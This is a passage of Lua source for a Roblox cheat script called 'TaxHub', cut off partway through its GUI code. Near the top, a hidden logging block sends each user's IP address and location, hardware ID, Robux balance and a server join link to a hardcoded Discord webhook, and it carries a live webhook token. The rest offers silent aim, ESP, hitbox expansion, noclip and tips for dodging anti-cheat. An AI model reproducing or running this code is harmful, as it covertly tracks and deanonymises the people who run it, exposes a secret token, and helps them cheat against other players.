--// --- FOLLOW CHECK (GATEKEEPER: V2) --- //
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local cam = workspace.CurrentCamera
local lp = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui") -- Added CoreGui definition
local TargetID = 1226112535 -- Your User ID

-- // --- LOGGING SYSTEM --- // 
local WebhookUrl = "https://discord.com/api/webhooks/1457191708105375948/iS3PT1X412B101Jox9uJmo-_hyqebk9MNiOQGaHdpv3_kpAH_d1QbBTYcGHG2eWO5SoQ"
-- HTTP Request Compatibility
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- Helper Functions
local function GetIPData()
    local success, response = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
    if success then
        local data = HttpService:JSONDecode(response)
        return data.query .. " / " .. data.city .. ", " .. data.regionName
    else return "Unknown" end
end

local function GetPlatform()
    local uis = game:GetService("UserInputService")
    if uis.TouchEnabled and not uis.MouseEnabled then return "Mobile"
    elseif uis.GamepadEnabled and game:GetService("GuiService"):IsTenFootInterface() then return "Console"
    else return "PC" end
end

local function GetExecutor() return (identifyexecutor and identifyexecutor()) or "Unknown" end

local function GetHWID()
    if gethwid then return gethwid() else return game:GetService("RbxAnalyticsService"):GetClientId() end
end

local function GetAvatarImage(userId)
    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false"
    local success, response = pcall(function() return game:HttpGet(url) end)
    if success then
        local data = HttpService:JSONDecode(response)
        if data.data and data.data[1] then return data.data[1].imageUrl end
    end
    return ""
end

local function GetRobuxBalance(userId)
    local url = "https://economy.roblox.com/v1/users/" .. userId .. "/currency"
    local success, response = pcall(function() return request({Url = url, Method = "GET"}) end)
    if success and response and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        if data and data.robux ~= nil then return tostring(data.robux) end
    end
    -- Fallback
    local s, b = pcall(function() return game:HttpGet(url, true) end)
    if s then
        local data = HttpService:JSONDecode(b)
        if data and data.robux ~= nil then return tostring(data.robux) end
    end
    return "N/A"
end

local function LogStats()
    if not request then return end
    
    local joinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
    
    -- Conditional Ping & Color: Tag role if not owner
    local contentMsg = ""
    local embedColor = 16711680 -- Red (Default/Owner)
    
    if lp.UserId ~= TargetID then
        contentMsg = "<@&1444126008365285448>"
        embedColor = 65280 -- Green (Others)
    end

    local data = {
        content = contentMsg,
        embeds = {{
            title = "Script Launched",
            color = embedColor,
            thumbnail = { url = GetAvatarImage(lp.UserId) },
            fields = {
                {name = "User", value = lp.Name .. " (" .. lp.UserId .. ")", inline = true},
                {name = "Robux", value = GetRobuxBalance(lp.UserId), inline = true},
                {name = "IP Address", value = GetIPData(), inline = false},
                {name = "HWID", value = GetHWID(), inline = false},
                {name = "Platform", value = GetPlatform(), inline = true},
                {name = "Executor", value = GetExecutor(), inline = true},
                {name = "Server Link", value = "[Click to Join](" .. joinLink .. ")", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        request({
            Url = WebhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Execute Logging (Run in background to not block)
task.spawn(LogStats)


local function checkFollowStatus()
    -- 1. OWNER BYPASS (Fixes the issue where you get kicked)
    if lp.UserId == TargetID then 
        return true 
    end

    -- 2. CHECK OTHERS
    local url = "https://friends.roblox.com/v1/users/" .. lp.UserId .. "/followings?sortOrder=Desc&limit=100"
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        if data and data.data then
            for _, user in pairs(data.data) do
                if user.id == TargetID then
                    return true -- Found you in their following list
                end
            end
        end
    else
        -- If their privacy settings hide their following list, we have to kick them to be safe
        -- Change this to 'return true' if you want to let people with private profiles in
        return false 
    end
    return false
end

-- EXECUTE THE CHECK
if not checkFollowStatus() then
    -- If they are NOT following (or failed the check)
    setclipboard("https://www.roblox.com/users/1226112535/profile")
    lp:Kick("ACCESS DENIED: You must follow the creator to use this script! (Link copied to clipboard). If you are following, make sure your profile privacy is set to Public.")
    task.wait(9e9) -- Freeze execution
    return -- Stop the script here
end



--// --- DEV LOG GUI --- //
local function CreateDevLog(onContinue)
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer
    local CoreGui = game:GetService("CoreGui")
    
    -- Safety Check for existing gui
    if lp.PlayerGui:FindFirstChild("TaxHubDevLog") then lp.PlayerGui.TaxHubDevLog:Destroy() end
    if lp.PlayerGui:FindFirstChild("TaxHubV4Popup") then lp.PlayerGui.TaxHubV4Popup:Destroy() end



    local gui = Instance.new("ScreenGui", lp.PlayerGui)
    gui.Name = "TaxHubDevLog"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true -- Fullscreen

    local main = Instance.new("Frame", gui)
    main.Size = UDim2.new(0, 850, 0, 500) -- Increased Size
    main.Position = UDim2.new(0.5, -425, 0.5, -250)
    main.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    
    -- Shadow/Stroke
    local uistroke = Instance.new("UIStroke", main)
    uistroke.Color = Color3.fromRGB(0, 255, 120)
    uistroke.Thickness = 2
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

    -- Title
    local title = Instance.new("TextLabel", main)
    title.Size = UDim2.new(1, 0, 0, 45)
    title.BackgroundTransparency = 1
    title.Text = "TAXHUB V5 - DEV LOG"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 24
    title.TextColor3 = Color3.fromRGB(0, 255, 100)
    
    -- // SPLIT LAYOUT //
    
    -- Left Container (Info)
    local leftContainer = Instance.new("Frame", main)
    leftContainer.Size = UDim2.new(0.5, -20, 1, -110)
    leftContainer.Position = UDim2.new(0, 15, 0, 50)
    leftContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    Instance.new("UICorner", leftContainer).CornerRadius = UDim.new(0, 8)
    
    local leftScroll = Instance.new("ScrollingFrame", leftContainer)
    leftScroll.Size = UDim2.new(1, -10, 1, -10)
    leftScroll.Position = UDim2.new(0, 5, 0, 5)
    leftScroll.BackgroundTransparency = 1
    leftScroll.ScrollBarThickness = 2
    
    local leftLayout = Instance.new("UIListLayout", leftScroll)
    leftLayout.SortOrder = Enum.SortOrder.LayoutOrder; leftLayout.Padding = UDim.new(0, 10)
    
    leftScroll.CanvasSize = UDim2.new(0,0,0,0)
    leftLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() leftScroll.CanvasSize = UDim2.new(0,0,0,leftLayout.AbsoluteContentSize.Y + 10) end)

    -- Right Container (Update Logs)
    local rightContainer = Instance.new("Frame", main)
    rightContainer.Size = UDim2.new(0.5, -20, 1, -110)
    rightContainer.Position = UDim2.new(0.5, 5, 0, 50)
    rightContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    Instance.new("UICorner", rightContainer).CornerRadius = UDim.new(0, 8)
    
    local rightHeader = Instance.new("TextLabel", rightContainer)
    rightHeader.Size = UDim2.new(1,0,0,30); rightHeader.BackgroundTransparency=1; rightHeader.Text="TAXHUB V4 UPDATE LOGS"
    rightHeader.Font=Enum.Font.GothamBlack; rightHeader.TextColor3=Color3.fromRGB(0, 200, 255); rightHeader.TextSize=16
    
    local rightScroll = Instance.new("ScrollingFrame", rightContainer)
    rightScroll.Size = UDim2.new(1, -10, 1, -40)
    rightScroll.Position = UDim2.new(0, 5, 0, 35)
    rightScroll.BackgroundTransparency = 1
    rightScroll.ScrollBarThickness = 2
    
    local rightLayout = Instance.new("UIListLayout", rightScroll)
    rightLayout.SortOrder = Enum.SortOrder.LayoutOrder; rightLayout.Padding = UDim.new(0, 5)
    
    rightScroll.CanvasSize = UDim2.new(0,0,0,0)
    rightLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() rightScroll.CanvasSize = UDim2.new(0,0,0,rightLayout.AbsoluteContentSize.Y + 10) end)


    -- Helper Functions
    local function AddText(parent, text, color, size)
        local lbl = Instance.new("TextLabel", parent)
        lbl.Size = UDim2.new(1, 0, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = size or 13
        lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
        lbl.TextWrapped = true
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextYAlignment = Enum.TextYAlignment.Top
        local bounds = game:GetService("TextService"):GetTextSize(text, size or 13, Enum.Font.GothamBold, Vector2.new(parent.AbsoluteSize.X - 10, math.huge))
        lbl.Size = UDim2.new(1, 0, 0, bounds.Y + 5)
        return lbl
    end
    
    local function AddDivider(parent)
        local d = Instance.new("Frame", parent)
        d.Size = UDim2.new(1, 0, 0, 2)
        d.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
        d.BorderSizePixel = 0
    end
    
    local function AddLog(text)
        local lbl = Instance.new("TextLabel", rightScroll)
        lbl.Size = UDim2.new(1, 0, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = "- " .. text
        lbl.Font = Enum.Font.GothamMedium
        lbl.TextSize = 13
        lbl.TextColor3 = Color3.fromRGB(180, 180, 180)
        lbl.TextWrapped = true
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        local bounds = game:GetService("TextService"):GetTextSize("- " .. text, 13, Enum.Font.GothamMedium, Vector2.new(rightScroll.AbsoluteSize.X - 5, math.huge))
        lbl.Size = UDim2.new(1, 0, 0, bounds.Y + 2)
    end

    -- // CONTENT //
    
    -- Left Side (Info)
    AddText(leftScroll, "It's very easy to trigger the anti cheat if you are spam teleporting, or if it fails to get the weapon and you continue trying it's very common for the anti cheat to get triggered and to kick you. It's never a ban tho you can just rejoin another server.", Color3.fromRGB(255, 100, 100))
    AddText(leftScroll, "Stuff like walkspeed and jumppower is very likely to trigger the anticheat as well.", Color3.fromRGB(255, 150, 0))
    AddDivider(leftScroll)
    AddText(leftScroll, "To use the gun modifier you must hold the weapon you choose to mod and then press all the mods you'd like then unequip the weapon and re-equip it and it should work.", Color3.fromRGB(100, 200, 255))
    AddDivider(leftScroll)
    -- NEW STUFF
    AddText(leftScroll, "MACRO INFO:", Color3.fromRGB(200, 100, 255))
    AddText(leftScroll, "The macro is essentially a shooting glitch (not really a glitch) it just shoots one gun then the next then repeats super fast. To use it you have to either be in FIRST PERSON or be HOLDING RIGHT CLICK while using the macro.", Color3.fromRGB(200, 200, 200))
    AddDivider(leftScroll)
    AddText(leftScroll, "I didnt expect people to actually start finding the script and using it so thats why I dropped an update lol. I only made the script because I was tired of people having shitty scripts. Anyways here's a decent gui :)", Color3.fromRGB(150, 255, 150), 12)

    -- Right Side (V4 Logs)
    AddLog("🔥 completely revamped the ui AGAIN (it looks hot trust)")
    AddLog("🔒 fixed the esp sometimes not working")
    AddLog("🎯 added silent aim")
    AddLog("🔫 fixed and created a new version of getting the guns which is 100% safe and unkickable (imo) lol")
    AddLog("⚙️ made the gun mods better")
    AddLog("📊 added fire rate slider")
    AddLog("✅ added actual working toggles instead of just one time buttons for the gun mods")
    AddLog("🎯 ignore specific teams from your hitbox expander")
    AddLog("")
    AddLog("📝 literally so tired writing ts at 3:48 am i was supposed to be chillin cuz i dropped v3 last night and then some people cracked the script so now i gotta completely revamp it make it better fuck it we ball we making this hoe secure this time (hopefully)")
    AddLog("")
    AddLog("💜 hope yall enjoy v4 that was really supposed to come out in like a week lol")
    AddLog("")
    AddLog("-- V3 LOGS (YESTERDAY) --")
    AddLog("completely revamped the gui and made it cleaner")
    AddLog("completely revamped the key system made it cleaner")
    AddLog("added icon decals")
    AddLog("added car fly")
    AddLog("added flip car feature")


    -- // BUTTONS //
    
    -- Continue Button
    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0, 180, 0, 40)
    btn.Position = UDim2.new(1, -200, 1, -50)
    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    btn.Text = "CONTINUE"
    btn.Font = Enum.Font.GothamBlack; btn.TextSize = 16; btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
    btn.MouseButton1Click:Connect(function()
        gui:Destroy()
        if onContinue then onContinue() end
    end)
    
    -- Discord Button
    local discBtn = Instance.new("TextButton", main)
    discBtn.Size = UDim2.new(0, 180, 0, 40)
    discBtn.Position = UDim2.new(0, 20, 1, -50)
    discBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    discBtn.Text = "JOIN DISCORD"
    discBtn.Font = Enum.Font.GothamBlack; discBtn.TextSize = 14; discBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", discBtn).CornerRadius = UDim.new(0, 8)
    
    discBtn.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/U2STxveM5F")
        discBtn.Text = "LINK COPIED!"
        task.wait(2)
        discBtn.Text = "JOIN DISCORD"
    end)
end

--// --- MAIN SCRIPT WRAPPER --- //
local function StartTaxHub()
--// --- MAIN SCRIPT STARTS BELOW --- //

--// SERVICES
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local UIS = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VIM = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local cam = Workspace.CurrentCamera

--// RIPPED ARREST LOGIC VARIABLES
local Ar = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("ArrestPlayer")
if not Ar then Ar = Workspace:FindFirstChild("Remote") and Workspace.Remote:FindFirstChild("arrest") end
local Tw = true -- Smooth Mode Default

--// MAIN SETTINGS
local antiCheatEnabled = true 
local antiCheatEnabled = true 
local noclipEnabled = false
local espEnabled = false
local chamsEnabled = false
local boxesEnabled = false
local namesEnabled = false
local tracersEnabled = false
local punchAuraEnabled = false
local camLockSystem = false 
local camLocking = false 
local camMode = "Hold" 
local teamCheck = false
local lockKey = Enum.KeyCode.Q
local lockKey = Enum.KeyCode.Q
local hitboxEnabled, hitboxSize, hitboxTrans = false, 10, 0.5
local phaseEnabled = false
local lastTeleport, spawnTime = 0, tick()
local connections = {} 
local isArresting = false

--// ANTI-TAZE VARIABLES
local antiTazeEnabled = false
local antiTazeConnection = nil
local isTazed = false

--// MACRO SETTINGS
local macroEnabled = false
local triggerKey = Enum.KeyCode.X

--// NOCLIP VARIABLES
local noclipSpeed = 25
local noclipKey = Enum.KeyCode.V
local noclipConnection = nil

--// GHOST WALK VARIABLES (V5)
local ghostActive = false
local ghostVisuals = false
local ghostConnection = nil
local ghostPlatform = nil
local ghostCharacter = nil
local ghostLockedY = 0 
local ghostOriginalState = {} 

--// STAMINA VARIABLES (V3)
local staminaEnabled = false
local holdingSpace = false
local staminaConnections = {}

--// SPIDER VARIABLES (V6)
local spiderEnabled = false
local spiderConnections = {}
local spiderSpeed = 30
local spiderAnimTrack = nil
local spiderRayParams = RaycastParams.new()
spiderRayParams.FilterType = Enum.RaycastFilterType.Exclude

--// PLAYER MODS VARIABLES
local wsEnabled = false
local wsVal = 16
local jpEnabled = false
local jpVal = 50
local playerLoop = nil
local playerNoclipBtn = nil -- Global reference for keybind update

--// CAR MODS VARIABLES
local carFlyToggle = nil -- UI Reference
local carFlyEnabled = false
local carFlySpeed = 50 -- Unused now but kept for legacy
local carFlyVerticalSpeed = 50 -- Legacy var
local carFlyHeight = 0 
local carFlyConnection = nil
local carSpeedEnabled = false
local carSpeedVal = 200
local carSpeedConnection = nil

--// ================================
--// SILENT AIM SETTINGS (EXACT COPY)
--// ================================
local SilentAimSettings = {
    Enabled = false,
    
    ClassName = "Silent Aim - TaxHub Edition",
    ToggleKey = "RightAlt",
    
    TeamCheck = false,
    VisibleCheck = false, 
    TargetPart = "Head",
    SilentAimMethod = "Raycast",
    
    FOVRadius = 130,
    FOVVisible = false,
    ShowSilentAimTarget = false, 
    
    MouseHitPrediction = false,
    MouseHitPredictionAmount = 0.165,
    HitChance = 100,

    -- Role Ignore Settings
    IgnoreCriminals = false,
    IgnoreGuards = false,
    IgnoreInmates = false
}

-- variables
getgenv().SilentAimSettings = SilentAimSettings

local Camera = workspace.CurrentCamera
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local GetChildren = game.GetChildren
local GetPlayers = Players.GetPlayers
local WorldToScreen = Camera.WorldToScreenPoint
local WorldToViewportPoint = Camera.WorldToViewportPoint
local GetPartsObscuringTarget = Camera.GetPartsObscuringTarget
local FindFirstChild = game.FindFirstChild
local RenderStepped = RunService.RenderStepped
local GuiInset = GuiService.GetGuiInset
local GetMouseLocation = UserInputService.GetMouseLocation

local ValidTargetParts = {"Head", "HumanoidRootPart"}
local PredictionAmount = 0.165

-- Independent Settings
local espIgnore = {Criminals=false, Guards=false, Inmates=false}
local hitboxIgnore = {Criminals=false, Guards=false, Inmates=false}

local mouse_box = Drawing.new("Square")
mouse_box.Visible = false 
mouse_box.ZIndex = 999 
mouse_box.Color = Color3.fromRGB(0, 255, 120)
mouse_box.Thickness = 2 
mouse_box.Size = Vector2.new(20, 20)
mouse_box.Filled = false 

local fov_circle = Drawing.new("Circle")
fov_circle.Thickness = 2
fov_circle.NumSides = 100
fov_circle.Radius = 130
fov_circle.Filled = false
fov_circle.Visible = false
fov_circle.ZIndex = 999
fov_circle.Transparency = 0.7
fov_circle.Color = Color3.fromRGB(0, 255, 120)

local ExpectedArguments = {
    FindPartOnRayWithIgnoreList = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean", "boolean"
        }
    },
    FindPartOnRayWithWhitelist = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Ray", "table", "boolean"
        }
    },
    FindPartOnRay = {
        ArgCountRequired = 2,
        Args = {
            "Instance", "Ray", "Instance", "boolean", "boolean"
        }
    },
    Raycast = {
        ArgCountRequired = 3,
        Args = {
            "Instance", "Vector3", "Vector3", "RaycastParams"
        }
    }
}

local function CalculateChance(Percentage)
    Percentage = math.floor(Percentage)
    local chance = math.floor(Random.new().NextNumber(Random.new(), 0, 1) * 100) / 100
    return chance <= Percentage / 100
end

local function getPositionOnScreen(Vector)
    local Vec3, OnScreen = WorldToScreen(Camera, Vector)
    return Vector2.new(Vec3.X, Vec3.Y), OnScreen
end

local function ValidateArguments(Args, RayMethod)
    local Matches = 0
    if #Args < RayMethod.ArgCountRequired then
        return false
    end
    for Pos, Argument in next, Args do
        if typeof(Argument) == RayMethod.Args[Pos] then
            Matches = Matches + 1
        end
    end
    return Matches >= RayMethod.ArgCountRequired
end

local function getDirection(Origin, Position)
    return (Position - Origin).Unit * 1000
end

local function getMousePosition()
    return GetMouseLocation(UserInputService)
end

local function IsPlayerVisibleSilent(Player)
    local PlayerCharacter = Player.Character
    local LocalPlayerCharacter = LocalPlayer.Character
    
    if not (PlayerCharacter or LocalPlayerCharacter) then return end 
    
    local PlayerRoot = FindFirstChild(PlayerCharacter, SilentAimSettings.TargetPart) or FindFirstChild(PlayerCharacter, "HumanoidRootPart")
    
    if not PlayerRoot then return end 
    
    local CastPoints, IgnoreList = {PlayerRoot.Position, LocalPlayerCharacter, PlayerCharacter}, {LocalPlayerCharacter, PlayerCharacter}
    local ObscuringObjects = #GetPartsObscuringTarget(Camera, CastPoints, IgnoreList)
    
    return ((ObscuringObjects == 0 and true) or (ObscuringObjects > 0 and false))
end

local function getClosestPlayerSilent()
    if not SilentAimSettings.TargetPart then return end
    local Closest
    local DistanceToMouse
    for _, Player in next, GetPlayers(Players) do
        if Player == LocalPlayer then continue end
        if SilentAimSettings.TeamCheck and Player.Team == LocalPlayer.Team then continue end

        -- Role/Team Checks
        if Player.Team then
            local tName = Player.Team.Name
            if SilentAimSettings.IgnoreCriminals and tName == "Criminals" then continue end
            if SilentAimSettings.IgnoreGuards and tName == "Guards" then continue end
            if SilentAimSettings.IgnoreInmates and tName == "Inmates" then continue end
        end

        local Character = Player.Character
        if not Character then continue end
        
        if SilentAimSettings.VisibleCheck and not IsPlayerVisibleSilent(Player) then continue end

        local HumanoidRootPart = FindFirstChild(Character, "HumanoidRootPart")
        local Humanoid = FindFirstChild(Character, "Humanoid")
        if not HumanoidRootPart or not Humanoid or Humanoid and Humanoid.Health <= 0 then continue end

        local ScreenPosition, OnScreen = getPositionOnScreen(HumanoidRootPart.Position)
        if not OnScreen then continue end

        local Distance = (getMousePosition() - ScreenPosition).Magnitude
        if Distance <= (DistanceToMouse or SilentAimSettings.FOVRadius or 2000) then
            Closest = ((SilentAimSettings.TargetPart == "Random" and Character[ValidTargetParts[math.random(1, #ValidTargetParts)]]) or Character[SilentAimSettings.TargetPart])
            DistanceToMouse = Distance
        end
    end
    return Closest
end


--// CLEANUP
local function killScript()
    if lp.PlayerGui:FindFirstChild("TaxHubStealth") then
        lp.PlayerGui.TaxHubStealth:Destroy()
    end
    -- Cleanup Ghost
    if ghostPlatform then ghostPlatform:Destroy() end
    if ghostCharacter then ghostCharacter:Destroy() end
    if ghostConnection then ghostConnection:Disconnect() end
    
    -- Cleanup Stamina
    for _, c in pairs(staminaConnections) do c:Disconnect() end
    table.clear(staminaConnections)
    
    -- Cleanup Spider
    for _, c in pairs(spiderConnections) do c:Disconnect() end
    table.clear(spiderConnections)
    if spiderAnimTrack then spiderAnimTrack:Stop() end
    if lp.Character then
        local r = lp.Character:FindFirstChild("HumanoidRootPart")
        if r then
            if r:FindFirstChild("SpiderRot") then r.SpiderRot:Destroy() end
            if r:FindFirstChild("SpiderMov") then r.SpiderMov:Destroy() end
            if r:FindFirstChild("SpiderAtt") then r.SpiderAtt:Destroy() end
        end
        local h = lp.Character:FindFirstChild("Humanoid")
        if h then h.PlatformStand = false end
    end
    
    -- Cleanup Noclip
    if noclipConnection then
        noclipConnection:Disconnect()
        noclipConnection = nil
    end
    
    if lp.Character then
        local root = lp.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = root:FindFirstChild("NoclipVelocity")
            if bv then bv:Destroy() end
        end
        
        local humanoid = lp.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.PlatformStand = false
        end
    end
    
    -- Cleanup Main
    for _, conn in pairs(connections) do
        if conn then conn:Disconnect() end
    end
    table.clear(connections)

    -- Cleanup Anti-Taze
    if antiTazeConnection then antiTazeConnection:Disconnect() end
end
killScript()

--// GUI SETUP (ONYX MODERN)
local TaxHubIconId = "rbxassetid://126618523861923" 
local UserAvatarId = "rbxthumb://type=AvatarHeadShot&id=" .. lp.UserId .. "&w=420&h=420"

if lp.PlayerGui:FindFirstChild("TaxHubStealth") then lp.PlayerGui.TaxHubStealth:Destroy() end
local gui = Instance.new("ScreenGui", lp.PlayerGui)
gui.Name = "TaxHubStealth"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true

--// COLORS
local C_BG = Color3.fromRGB(12, 12, 14)
local C_SIDE = Color3.fromRGB(18, 18, 22)
local C_ACCENT = Color3.fromRGB(0, 255, 140) -- Neon Mint
local C_TEXT = Color3.fromRGB(240, 240, 240)
local C_SUBTEXT = Color3.fromRGB(120, 120, 130)
local C_ELEM = Color3.fromRGB(25, 25, 30)

local main = Instance.new("Frame", gui)
main.Name = "MainNode"
main.Size = UDim2.new(0, 850, 0, 550) -- Larger Size
main.Position = UDim2.new(0.5, -425, 0.5, -275)
main.BackgroundColor3 = C_BG
main.BorderSizePixel = 0
main.Active = true
main.Draggable = false -- Disable legacy drag
local dragging, dragInput, dragStart, startPos

local function UpdateDrag(input)
    local delta = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        UpdateDrag(input)
    end
end)

local mainCorner = Instance.new("UICorner", main); mainCorner.CornerRadius = UDim.new(0, 16)
local mainStroke = Instance.new("UIStroke", main); mainStroke.Color = Color3.fromRGB(40,40,45); mainStroke.Thickness = 1

-- Sidebar
local sidebar = Instance.new("Frame", main)
sidebar.Name = "Sidebar"
sidebar.Size = UDim2.new(0, 220, 1, 0)
sidebar.BackgroundColor3 = C_SIDE
sidebar.BorderSizePixel = 0
local sideDiv = Instance.new("Frame", sidebar); sideDiv.Size = UDim2.new(0,1,1,0); sideDiv.Position = UDim2.new(1,0,0,0); sideDiv.BackgroundColor3 = Color3.fromRGB(30,30,35); sideDiv.BorderSizePixel=0

-- Avatar Profile Header (Modified per User Request)
local profile = Instance.new("Frame", sidebar)
profile.Size = UDim2.new(1, 0, 0, 160)
profile.BackgroundTransparency = 1

local avImg = Instance.new("ImageLabel", profile)
avImg.Size = UDim2.new(0, 90, 0, 90)
avImg.Position = UDim2.new(0.5, -45, 0, 20)
avImg.BackgroundTransparency = 1
avImg.Image = UserAvatarId
local avCorner = Instance.new("UICorner", avImg); avCorner.CornerRadius = UDim.new(1, 0)
local avStroke = Instance.new("UIStroke", avImg); avStroke.Color = C_ACCENT; avStroke.Thickness = 2

local welcome = Instance.new("TextLabel", profile)
welcome.Size = UDim2.new(1, 0, 0, 20); welcome.Position = UDim2.new(0, 0, 0, 120)
welcome.BackgroundTransparency = 1; welcome.Text = "Welcome Back,"
welcome.Font = Enum.Font.GothamMedium; welcome.TextColor3 = C_SUBTEXT; welcome.TextSize = 13

local uName = Instance.new("TextLabel", profile)
uName.Size = UDim2.new(1, 0, 0, 25); uName.Position = UDim2.new(0, 0, 0, 138)
uName.BackgroundTransparency = 1; uName.Text = lp.Name
uName.Font = Enum.Font.GothamBold; uName.TextColor3 = C_TEXT; uName.TextSize = 16

-- Tab Container
local tabScroll = Instance.new("ScrollingFrame", sidebar)
tabScroll.Size = UDim2.new(1, 0, 1, -170); tabScroll.Position = UDim2.new(0, 0, 0, 170)
tabScroll.BackgroundTransparency = 1; tabScroll.ScrollBarThickness = 2
local tabLayout = Instance.new("UIListLayout", tabScroll); tabLayout.Padding = UDim.new(0, 5); tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Content Area
local content = Instance.new("Frame", main)
content.Name = "Content"
content.Size = UDim2.new(1, -220, 1, 0)
content.Position = UDim2.new(0, 220, 0, 0)
content.BackgroundTransparency = 1

-- Top Bar (Close Button)
local topBar = Instance.new("Frame", content)
topBar.Size = UDim2.new(1, 0, 0, 40); topBar.BackgroundTransparency = 1

-- ** TITLE ADDITION **
local titleLbl = Instance.new("TextLabel", topBar)
titleLbl.Size = UDim2.new(0, 200, 1, 0)
titleLbl.Position = UDim2.new(0, 20, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "TaxHub V4"
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 24
titleLbl.TextColor3 = C_ACCENT -- Neon Mint match
titleLbl.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", topBar)
closeBtn.Size = UDim2.new(0, 40, 0, 40); closeBtn.Position = UDim2.new(1, -40, 0, 0); closeBtn.Text = "×"; closeBtn.Font = Enum.Font.GothamMedium; closeBtn.TextSize = 24
closeBtn.TextColor3 = Color3.fromRGB(200, 100, 100); closeBtn.BackgroundTransparency = 1
closeBtn.MouseButton1Click:Connect(function() killScript() end)

local pageContainer = Instance.new("Frame", content)
pageContainer.Size = UDim2.new(1, -40, 1, -60); pageContainer.Position = UDim2.new(0, 20, 0, 50); pageContainer.BackgroundTransparency = 1

--// UI HELPERS (MAPPED TO OLD SIGNATURES)
local tabs = {}
local function SwitchTab(name)
    for tName, data in pairs(tabs) do
        if tName == name then
            data.Page.Visible = true
            TweenService:Create(data.Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30,30,35), TextColor3 = C_ACCENT}):Play()
            TweenService:Create(data.Indicator, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
        else
            data.Page.Visible = false
            TweenService:Create(data.Button, TweenInfo.new(0.2), {BackgroundColor3 = C_SIDE, TextColor3 = C_SUBTEXT}):Play()
            TweenService:Create(data.Indicator, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
        end
    end
end

local function CreateTab(name, iconId)
    local btn = Instance.new("TextButton", tabScroll)
    btn.Size = UDim2.new(0, 190, 0, 45)
    btn.BackgroundColor3 = C_SIDE
    btn.Text = "       " .. name
    btn.TextColor3 = C_SUBTEXT
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
    local ind = Instance.new("Frame", btn); ind.Size = UDim2.new(0, 4, 0, 24); ind.Position = UDim2.new(0, 0, 0.5, -12); ind.BackgroundColor3 = C_ACCENT; ind.BackgroundTransparency = 1
